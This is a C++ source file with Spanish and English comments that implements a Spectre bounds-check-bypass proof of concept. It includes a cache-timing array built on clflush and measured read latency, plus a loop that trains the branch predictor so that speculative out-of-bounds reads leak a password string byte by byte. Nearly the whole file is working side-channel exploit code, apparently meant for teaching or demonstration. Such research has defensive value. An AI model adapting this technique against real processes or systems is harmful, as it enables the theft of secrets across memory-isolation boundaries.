#include <algorithm>
#include <cstddef>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <limits>
#include <memory>
#include <vector>
#include <x86intrin.h>

using namespace std;

const char *public_data = "Hello, World";
const char *private_data = "my password is 123adminABC";

// Funcion para leer latencia, pero esta definida en assembly
extern "C" uint64_t MeasureReadLatency(const void *address);

inline void FlushDataCacheLineNoBarrier(const void *address) {
  _mm_clflush(address);
}

inline void MemoryAndSpeculationBarrier() {
  // See docs/fencing.md
  _mm_mfence();
  _mm_lfence();
}

inline void FlushDataCacheLine(void *address) {
  FlushDataCacheLineNoBarrier(address);
  MemoryAndSpeculationBarrier();
}

constexpr size_t kCacheLineBytes = 64;
constexpr size_t kPageBytes = 4 * 1024;

void ForceRead(const void *p) {
  (void)*reinterpret_cast<const volatile char *>(p);
}

class TimingArray {
public:
  // Alias para los tipos de los elementos del array.
  using ValueType = int;

  // Hacer el array mas pequeño, no hace que mejore el bandwidth del
  // side-channel. Y tratar de filtrar mas de un byte a la vez incrementa
  // significativamente el ruido debido a un mayor cache contention.
  //
  // "Real" elementos porque se aumentan elementos buffer antes y despues.
  // Mirar comentario en `elements_` abajo.
  //
  // Cache contention ocurre cuando 2 o mas CPUs alternadamente y repetidamente
  // actualizan la misma cache line.
  static const size_t kRealElements = 256;

  TimingArray() {
    // Explicitamente inicializar los elementos del array
    //
    // No es importante que valor se escribe mientras se fuerze que *algo* sea
    // escrito a cada elemento. De otra forma,
    //
    // No es importante el valor que escribamos siempre que forcemos escribir
    // algo en cada elemento. De lo contrario, la asignación de respaldo podría
    // ser un rango de páginas de zero-fill-on-demand(ZFOD), de copy-on-writre
    // que todas comienzan mapeadas a la misma página física de ceros. Dado que
    // la caché en las CPUs modernas de Intel está etiquetada físicamente,
    // algunos elementos podrían asignarse a la misma línea de caché y no
    // observaríamos una diferencia de tiempo entre la lectura de elementos
    // accedidos y no accedidos.
    //
    // [EN]:
    // It's not important what value we write as long as we force *something* to
    // be written to each element. Otherwise, the backing allocation could be a
    // range of zero-fill-on-demand (ZFOD), copy-on-write pages that all start
    // off mapped to the same physical page of zeros. Since the cache on modern
    // Intel CPUs is physically tagged, some elements might map to the same
    // cache line and we wouldn't observe a timing difference between reading
    // accessed and unaccessed elements.
    for (int i = 0; i < size(); ++i) {
      ElementAt(i) = -1;
    }

    // Init the first time through, then keep for later instances.
    static uint64_t threshold = FindCachedReadLatencyThreshold();
    cached_read_latency_threshold_ = threshold;
  }

  TimingArray(TimingArray &) = delete;
  TimingArray &operator=(TimingArray &) = delete;

  ValueType &operator[](size_t i) {
    // Map index to element.
    //
    // As mentioned in the class comment, we try to frustrate hardware
    // prefetchers by applying a permutation so elements don't appear in
    // memory in index order. We do this by using a Linear Congruential
    // Generator (LCG) where the size of the array is the modulus.
    // To guarantee that this is a permutation, we just need to follow the
    // requirements here:
    //
    // https://en.wikipedia.org/wiki/Linear_congruential_generator#c_%E2%89%A0_0
    //
    // In this case, 113 makes a good choice: 113 is prime, 113-1 = 112 is
    // divisible by 256's only prime factor (2), both are divisible by 4.
    // If the array were dynamically sized, we would not be able to hardcode
    // 113, and it would be difficult to produce a good multiplier.
    // It may be desirable, instead, to switch to a different PRNG
    // that also supports small periods and efficient seeking.
    // (For example, a Permuted Congruential Generator.)
    static_assert(kRealElements == 256, "consider changing 113");
    size_t el = (100 + i * 113) % kRealElements;

    // Add 1 to skip leading buffer element.
    return elements_[1 + el].cache_lines[0].value;
  }

  // We intentionally omit the "const" accessor:
  //    const ValueType& operator[](size_t i) const { ... }
  //
  // At the level of abstraction we care about, accessing an element at all
  // (even to read it) is not "morally const" since it mutates cache state.

  size_t size() const { return kRealElements; }

  // Flushes all elements of the array from the cache.
  void FlushFromCache() {
    // We only need to flush the cache lines with elements on them.
    for (int i = 0; i < size(); ++i) {
      FlushDataCacheLineNoBarrier(&ElementAt(i));
    }

    // Wait for flushes to finish.
    MemoryAndSpeculationBarrier();
  }

  // Reads elements of the array in index order, starting with index 0, and
  // looks for the first read that was fast enough to have come from the cache.
  //
  // Returns the index of the first "fast" element, or -1 if no element was
  // obviously read from the cache.
  //
  // This function uses a heuristic that errs on the side of false *negatives*,
  // so it is common to use it in a loop. Of course, measuring the time it
  // takes to read an element has the side effect of bringing that element into
  // the cache, so the loop must include a cache flush and re-attempt the
  // side-channel leak.
  int FindFirstCachedElementIndex() {
    // Start "after" the last element, which means start at the first.
    return FindFirstCachedElementIndexAfter(size() - 1);
  }

  // Just like `FindFirstCachedElementIndex`, except it begins right *after*
  // the index `start_after`, wrapping around to try all array elements. That
  // is, the first element read is `(start_after+1) % size` and the last
  // element read before returning -1 is `start_after`.
  int FindFirstCachedElementIndexAfter(int start_after) {
    // Fail if element is out of bounds.
    if (start_after >= size()) {
      return -1;
    }

    // Start at the element after `start_after`, wrapping around until we've
    // found a cached element or tried every element.
    for (int i = 1; i <= size(); ++i) {
      int el = (start_after + i) % size();
      uint64_t read_latency = MeasureReadLatency(&ElementAt(el));
      if (read_latency <= cached_read_latency_threshold_) {
        return el;
      }
    }

    // Didn't find a cached element.
    return -1;
  }

  // Returns the threshold value used by FindFirstCachedElementIndex to
  // identify reads that came from cache.
  uint64_t cached_read_latency_threshold() const {
    return cached_read_latency_threshold_;
  }

private:
  // Convenience so we don't have (*this)[i] everywhere.
  ValueType &ElementAt(size_t i) { return (*this)[i]; }

  uint64_t cached_read_latency_threshold_;
  uint64_t FindCachedReadLatencyThreshold() {

    const int iterations = 1000;
    const int percentile = 10;

    // Accumulates the highest read latency seen in each iteration.
    vector<uint64_t> max_read_latencies;

    for (int n = 0; n < iterations; ++n) {
      // Bring all elements into cache.
      for (int i = 0; i < size(); ++i) {
        ForceRead(&ElementAt(i));
      }

      // Read each element and keep track of the slowest read.
      uint64_t max_read_latency = numeric_limits<uint64_t>::min();
      for (int i = 0; i < size(); ++i) {
        max_read_latency =
            max(max_read_latency, MeasureReadLatency(&ElementAt(i)));
      }

      max_read_latencies.push_back(max_read_latency);
    }

    // Find and return the `percentile` max read latency value.
    sort(max_read_latencies.begin(), max_read_latencies.end());
    int index = (percentile / 100.0) * (max_read_latencies.size() - 1);
    return max_read_latencies[index];
  }

  // Define a struct that occupies one full cache line. Some compilers may not
  // support aligning at `kCacheLineBytes`, which is almost always greater than
  // `sizeof(max_align_t)`. In those cases we'll get a compile error.
  // See: https://timsong-cpp.github.io/cppwp/n3337/basic.align#9
  struct alignas(kCacheLineBytes) CacheLine {
    ValueType value;
  };
  static_assert(sizeof(CacheLine) == kCacheLineBytes, "");

  // Define our "Element" struct, which takes up one page plus one cache line.
  // When we allocate an array of these, we know that adjacent elements will
  // start on different pages and in different cache sets.
  static const int kCacheLinesPerPage = kPageBytes / kCacheLineBytes;
  struct Element {
    array<CacheLine, kCacheLinesPerPage + 1> cache_lines;
  };
  static_assert(sizeof(Element) == kPageBytes + kCacheLineBytes, "");

  // The actual backing store for the timing array, with buffer elements before
  // and after to avoid interference from adjacent heap allocations.
  //
  // We use `vector` here instead of `array` to avoid problems where
  // `TimingArray` is put on the stack and the class is so large it skips past
  // the stack guard page. This is more likely on PowerPC where the page size
  // (and therefore our element stride) is 64K.
  vector<Element> elements_{1 + kRealElements + 1};
};

// filtra byte que se encuentra fisicamente en &text[0]+offset
// sin si quiera cargarlo. En la "abstract machine", y en el codigo ejecutado
// por el CPU, esta funcion no carga ninguna memoria a excepcion de la que se
// encuentra dentro de los limites de 'text' y data auxiliar local
//
// En lugar, la filtracion se produce  mediante accesos fuera de limites
// durante speculative execution, pasando por alto la comprobacion de limites.
// Para eso se tiene que entrenar el branch predictor a que piense que el valor
// va estar dentro del rango.
static char LeakByte(const char *data, size_t offset) {
  TimingArray timing_array;
  // size necesita ser retirado de cache para poder forzar speculative
  // execution para poder adivinar el resultado.
  unique_ptr<size_t> size_in_heap =
      unique_ptr<size_t>(new size_t(strlen(data)));

  for (int run = 0;; ++run) {
    timing_array.FlushFromCache();
    // un offset diferent cada vez para garantizar que el valor un acceso
    // in-bounds sea diferente del valor secreto que queremos filtrar mediante
    // acceso out-of-bounds speculativo
    int safe_offset = run % strlen(data);

    // longitud del loop debe ser lo suficientemente largo para superar a los
    // branch predictors
    for (size_t i = 0; i < 2048; ++i) {
      // remover de cache
      FlushDataCacheLine(size_in_heap.get());

      // train branch predictor:
      // 2047 accesos in-bounds
      // luego en el acceso 2048, es out-of-bounds con el offset.
      //
      // El computo del valor del local_offset es branchless
      // y es equivalente a:
      // size_t local_offoset = ((i+1) % 2048) ? safe_offset : offset;
      // primer valor es 1 hasta 2047 y luego es 0
      // usa safe_offset 2047 veces y al final usa "offset"
      size_t local_offset =
          offset + (safe_offset - offset) * bool((i + 1) % 2048);
      //        ^                    ^ se cancela 2047 con unos y al final un 0
      //                               hace que utilice offset

      if (local_offset < *size_in_heap) {
        // esta ramificacion ha sido entrenada para que se tome durante
        // speculative execution, y es tomada en la itaracion 2048
        ForceRead(&timing_array[data[local_offset]]);
      }
    }
    int ret = timing_array.FindFirstCachedElementIndexAfter(data[safe_offset]);
    if (ret >= 0 && ret != data[safe_offset])
      return ret;
    if (run > 10000) {
      cerr << "Does not converge" << endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  cout << "Leaking the string: ";
  cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    cout << LeakByte(public_data, private_offset + i);
    cout.flush();
  }
  cout << "\n";
  exit(EXIT_SUCCESS);
}
